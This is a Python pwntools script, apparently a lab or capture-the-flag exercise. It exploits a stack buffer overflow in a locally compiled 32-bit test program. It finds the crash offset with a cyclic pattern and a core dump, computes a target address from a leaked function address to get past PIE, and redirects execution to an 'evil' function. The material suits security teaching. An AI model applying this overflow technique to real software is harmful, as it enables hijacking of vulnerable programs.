#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

#os.system("gcc -m32 -fno-stack-protector -fno-pie overflow.c")
os.system("gcc -m32 -pie -fpie -fno-stack-protector overflow_c.c")

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './a.out'

##===========================================================
##                    EXPLOIT GOES HERE
##===========================================================

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(256)
print(payload)


# Get the core dump
print("Just like in the previous part I had some problems with making corefiles work in docker. Hence, once again, copy the printed payload and run the application in gdb, after which I manually created the corefile")
exit()
core = Coredump('./core.1155')

# Our cyclic pattern should have been used as the crashing address
assert pack(core.eip) in payload

# Cool! Now let's just replace that value with the address of 'evil'
crash = ELF('./a.out')

io = process(['./a.out'])
print(io.recvline())
leak = io.recvline()
leak = int(re.search(r'0x[A-Fa-f0-9]+', leak.decode("utf-8")).group()[2:], 16)
print("Leak virtual address of can_you_do_it: ", hex(leak))
print("Address of evil: ", hex(crash.symbols.evil))
print("Address of can_you_do_it: ", hex(crash.symbols.can_you_do_it))

target_addr = leak-(crash.symbols.can_you_do_it-crash.symbols.evil)
print("Address target: ", hex(target_addr))

payload = fit({
    cyclic_find(core.eip): target_addr 
})
io.sendline(payload)
print(io.recvline())
print(io.recvline())
